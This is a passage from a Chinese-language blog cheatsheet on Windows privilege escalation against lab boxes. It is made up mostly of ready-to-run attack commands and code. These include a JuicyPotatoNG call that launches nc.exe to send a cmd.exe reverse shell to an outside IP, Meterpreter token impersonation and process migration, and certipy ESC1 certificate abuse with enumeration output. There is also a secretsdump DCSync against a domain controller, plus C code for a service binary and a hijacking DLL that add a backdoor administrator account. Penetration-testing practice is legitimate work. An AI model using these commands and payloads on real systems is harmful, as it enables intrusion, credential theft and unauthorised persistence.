<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotatoNG.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e c:\windows\system32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span>&quot;</span><br></pre></td></tr></table></figure>
<p>CLSID</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">https://github.com/ohpe/juicy-potato/tree/master/CLSID</a></p>
</blockquote>
<p>Meterpreter</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -g</span><br><span class="line">impersonate_token <span class="string">&quot;BUILTIN\Administrators&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ps | grep services.exe</span><br><span class="line">Filtering on &#x27;services.exe&#x27;</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID  PPID  Name		  Arch  Session  User			   <span class="built_in">Path</span></span><br><span class="line"> ---  ----  ----		  ----  -------  ----			   ----</span><br><span class="line"> <span class="number">668</span>  <span class="number">580</span>   services.exe  x64   <span class="number">0</span>	  NT AUTHORITY\SYSTEM  C:\Windows\System32\services.exe</span><br><span class="line">migrate <span class="number">668</span></span><br></pre></td></tr></table></figure>
<h3 id="错误配置证书模板"><a class="markdownIt-Anchor" href="#错误配置证书模板"></a> 错误配置证书模板</h3>
<blockquote>
<p>This is a quick lab to familiarize with ECS1 privilege escalation technique, that illustrates how it’s possible to elevate from a regular user to domain administrator in a Windows Domain by abusing over-permissioned Active Directory Certificate Services (ADCS) certificate templates.<br />
<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a></p>
</blockquote>
<ul>
<li>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT # 任意证书申请对象</li>
<li>PkiExtendedKeyUsage: Client Authentication # 证书可用于AD</li>
<li>Enrollment Rights: Authenticated Users # 证书申请者为经验证的域用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure>
<p>查询是否存在错误配置的证书模板</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">	CA Name					   : sequel-DC-CA</span><br><span class="line">	DNS Name							: dc.sequel.htb</span><br><span class="line">	Certificate Subject		   : CN&#x3D;sequel-DC-CA, DC&#x3D;sequel, DC&#x3D;htb</span><br><span class="line">	Certificate Serial Number		 : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">	Certificate Validity Start	  : 2022-11-18 20:58:46+00:00</span><br><span class="line">	Certificate Validity End			: 2121-11-18 21:08:46+00:00</span><br><span class="line">	Web Enrollment				  : Disabled</span><br><span class="line">	User Specified SAN			  : Disabled</span><br><span class="line">	Request Disposition		   : Issue</span><br><span class="line">	Enforce Encryption for Requests  : Enabled</span><br><span class="line">	Permissions</span><br><span class="line">	  Owner					   : SEQUEL.HTB\Administrators</span><br><span class="line">	  Access Rights</span><br><span class="line">		ManageCertificates		  : SEQUEL.HTB\Administrators</span><br><span class="line">										  SEQUEL.HTB\Domain Admins</span><br><span class="line">										  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">		ManageCa						: SEQUEL.HTB\Administrators</span><br><span class="line">										  SEQUEL.HTB\Domain Admins</span><br><span class="line">										  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">		Enroll					  : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">	Template Name					 : UserAuthentication</span><br><span class="line">	Display Name						: UserAuthentication</span><br><span class="line">	Certificate Authorities	   : sequel-DC-CA</span><br><span class="line">	Enabled					   : True</span><br><span class="line">	Client Authentication			 : True</span><br><span class="line">	Enrollment Agent					: False</span><br><span class="line">	Any Purpose				   : False</span><br><span class="line">	Enrollee Supplies Subject		 : True</span><br><span class="line">	Certificate Name Flag			 : EnrolleeSuppliesSubject</span><br><span class="line">	Enrollment Flag			   : PublishToDs</span><br><span class="line">										  IncludeSymmetricAlgorithms</span><br><span class="line">	Private Key Flag					: 16777216</span><br><span class="line">										  65536</span><br><span class="line">										  ExportableKey</span><br><span class="line">	Extended Key Usage			  : Client Authentication</span><br><span class="line">										  Secure Email</span><br><span class="line">										  Encrypting File System</span><br><span class="line">	Requires Manager Approval		 : False</span><br><span class="line">	Requires Key Archival			 : False</span><br><span class="line">	Authorized Signatures Required  : 0</span><br><span class="line">	Validity Period			   : 10 years</span><br><span class="line">	Renewal Period				  : 6 weeks</span><br><span class="line">	Minimum RSA Key Length		  : 2048</span><br><span class="line">	Permissions</span><br><span class="line">	  Enrollment Permissions</span><br><span class="line">		Enrollment Rights			 : SEQUEL.HTB\Domain Admins</span><br><span class="line">										  SEQUEL.HTB\Domain Users</span><br><span class="line">										  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">	  Object Control Permissions</span><br><span class="line">		Owner						 : SEQUEL.HTB\Administrator</span><br><span class="line">		Write Owner Principals	  : SEQUEL.HTB\Domain Admins</span><br><span class="line">										  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">										  SEQUEL.HTB\Administrator</span><br><span class="line">		Write Dacl Principals		 : SEQUEL.HTB\Domain Admins</span><br><span class="line">										  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">										  SEQUEL.HTB\Administrator</span><br><span class="line">		Write Property Principals	 : SEQUEL.HTB\Domain Admins</span><br><span class="line">										  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">										  SEQUEL.HTB\Administrator</span><br><span class="line">	[!] Vulnerabilities</span><br><span class="line">	  ESC1						  : &#39;SEQUEL.HTB\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>
<p>域用户<code>ryan.cooper</code>为域管理员<code>administrator</code>申请证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb</span><br></pre></td></tr></table></figure>
<p>使用证书通过Kerberos生成TGT并还原为NT Hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure>
<h3 id="dcsync"><a class="markdownIt-Anchor" href="#dcsync"></a> dcsync</h3>
<blockquote>
<p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using &quot;<br />
”<br />
<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a><br />
&quot;<br />
有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />
《内网安全攻防》 P.296</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br></pre></td></tr></table></figure>
<h3 id="服务"><a class="markdownIt-Anchor" href="#服务"></a> 服务</h3>
<h4 id="服务程序"><a class="markdownIt-Anchor" href="#服务程序"></a> 服务程序</h4>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	i = system (<span class="string">&quot;net user bfl bfl123456. /add&quot;</span>);</span><br><span class="line">	i = system (<span class="string">&quot;net localgroup administrators bfl /add&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc bfl.c -o bfl.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restart-Service ServiceName</span><br></pre></td></tr></table></figure>
<h4 id="dll劫持"><a class="markdownIt-Anchor" href="#dll劫持"></a> DLL劫持</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE hModule,<span class="comment">// Handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD ul_reason_for_call,<span class="comment">// Reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved )</span> <span class="comment">// Reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> ( ul_reason_for_call )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH: <span class="comment">// A process is loading the DLL.</span></span><br><span class="line">		<span class="keyword">int</span> i;</span><br><span class="line">		i = system (<span class="string">&quot;net user bfl bfl123456. /add&quot;</span>);</span><br><span class="line">		i = system (<span class="string">&quot;net localgroup administrators bfl /add&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_THREAD_ATTACH: <span class="comment">// A process is creating a new thread.</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_THREAD_DETACH: <span class="comment">// A thread exits normally.</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH: <span class="comment">// A process unloads the DLL.</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc bfl.cpp --shared -o bfl.dll</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restart-Service ServiceName</span><br></pre></td></tr></table></figure>
<h4 id="unquoted-service-paths"><a class="markdownIt-Anchor" href="#unquoted-service-paths"></a> Unquoted Service Paths</h4>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Buffer Fly\Bufferfly.exe</span><br></pre></td></tr></table></figure>
<p>=&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Buffer.exe</span><br><span class="line">C:\Program Files\Buffer Fly\Bufferfly.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>xXxYOLOxXx
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/" title="靶机渗透手册">https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/08/Pentest-With-Meterpreter/" rel="prev" title="Pentest With Meterpreter">
      <i class="fa fa-chevron-left"></i> Pentest With Meterpreter
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/14/Vulnhub-JANGOW-1-0-1/" rel="next" title="Vulnhub_JANGOW_1.0.1">
      Vulnhub_JANGOW_1.0.1 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%89%8B%E5%86%8C"><span class="nav-number">1.</span> <span class="nav-text"> 靶机渗透手册</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text"> 情报收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E6%B8%97%E9%80%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 实际渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 靶机渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%BEip"><span class="nav-number">1.1.2.1.</span> <span class="nav-text"> 查找IP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.2.2.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web%E8%B7%AF%E5%BE%84"><span class="nav-number">1.1.2.3.</span> <span class="nav-text"> Web路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vhost"><span class="nav-number">1.1.2.4.</span> <span class="nav-text"> VHOST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smb%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.5.</span> <span class="nav-text"> SMB信息枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wordpress"><span class="nav-number">1.1.2.6.</span> <span class="nav-text"> Wordpress</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.2.1.</span> <span class="nav-text"> SSH弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%85%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text"> FTP匿名登入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smb%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.2.3.</span> <span class="nav-text"> SMB弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nfs%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD"><span class="nav-number">1.2.4.</span> <span class="nav-text"> NFS目录挂载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E8%AE%A4%E8%AF%81"><span class="nav-number">1.2.5.</span> <span class="nav-text"> Web认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ldap"><span class="nav-number">1.2.6.</span> <span class="nav-text"> LDAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-number">1.2.7.</span> <span class="nav-text"> Redis未授权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file_includsion"><span class="nav-number">1.2.8.</span> <span class="nav-text"> FILE_Includsion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xxe"><span class="nav-number">1.2.9.</span> <span class="nav-text"> XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.2.10.</span> <span class="nav-text"> 其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cap%E7%89%B9%E6%9D%83"><span class="nav-number">1.3.1.</span> <span class="nav-text"> cap特权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC"><span class="nav-number">1.3.2.</span> <span class="nav-text"> 流量监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell"><span class="nav-number">1.3.3.</span> <span class="nav-text"> Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E7%A0%81"><span class="nav-number">1.3.4.</span> <span class="nav-text"> 密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.3.5.</span> <span class="nav-text"> 本地服务探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#udf%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.6.</span> <span class="nav-text"> UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#udf%E6%96%87%E4%BB%B6dllso"><span class="nav-number">1.3.6.1.</span> <span class="nav-text"> UDF文件(dll&#x2F;so)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">1.3.6.2.</span> <span class="nav-text"> Mysql执行系统命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-suid"><span class="nav-number">1.3.7.</span> <span class="nav-text"> SUDO &amp; SUID</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#path"><span class="nav-number">1.3.7.1.</span> <span class="nav-text"> $PATH</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mail"><span class="nav-number">1.3.8.</span> <span class="nav-text"> mail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab"><span class="nav-number">1.3.9.</span> <span class="nav-text"> crontab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passwd%E5%8F%AF%E5%86%99"><span class="nav-number">1.3.10.</span> <span class="nav-text"> passwd可写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.11.</span> <span class="nav-text"> 系统漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-number">1.3.12.</span> <span class="nav-text"> 文件传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="nav-number">1.3.13.</span> <span class="nav-text"> 内网代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-2"><span class="nav-number">1.3.13.1.</span> <span class="nav-text"> Shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell"><span class="nav-number">1.3.14.</span> <span class="nav-text"> PowerShell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows"><span class="nav-number">2.</span> <span class="nav-text"> Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text"> 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.</span> <span class="nav-text"> 爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="nav-number">2.3.</span> <span class="nav-text"> 获取凭证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gmsadumper"><span class="nav-number">2.3.1.</span> <span class="nav-text"> gMSADumper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#allowed_to_delegate_to"><span class="nav-number">2.3.2.</span> <span class="nav-text"> allowed_to_delegate_to</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gpp"><span class="nav-number">2.3.3.</span> <span class="nav-text"> GPP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#portablekanban"><span class="nav-number">2.3.4.</span> <span class="nav-text"> PortableKanban</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-number">2.3.5.</span> <span class="nav-text"> mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kerberoasting"><span class="nav-number">2.3.6.</span> <span class="nav-text"> Kerberoasting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#as-rep-roasting"><span class="nav-number">2.3.7.</span> <span class="nav-text"> AS-REP Roasting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81"><span class="nav-number">2.3.8.</span> <span class="nav-text"> 获取运行程序、服务用户凭证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-credential-manager"><span class="nav-number">2.3.9.</span> <span class="nav-text"> Windows Credential Manager</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#laps"><span class="nav-number">2.3.10.</span> <span class="nav-text"> LAPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sam"><span class="nav-number">2.3.11.</span> <span class="nav-text"> SAM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ntdsdit"><span class="nav-number">2.3.12.</span> <span class="nav-text"> NTDS.DIT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lsass"><span class="nav-number">2.3.13.</span> <span class="nav-text"> LSASS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">2.4.</span> <span class="nav-text"> GetShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unconstrained-delegation"><span class="nav-number">2.5.</span> <span class="nav-text"> Unconstrained Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#constrained-delegation"><span class="nav-number">2.6.</span> <span class="nav-text"> Constrained Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#print-spooler-service-mitm"><span class="nav-number">2.7.</span> <span class="nav-text"> Print Spooler Service MITM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">2.8.</span> <span class="nav-text"> 注册表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84"><span class="nav-number">2.9.</span> <span class="nav-text"> 路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-2"><span class="nav-number">2.10.</span> <span class="nav-text"> 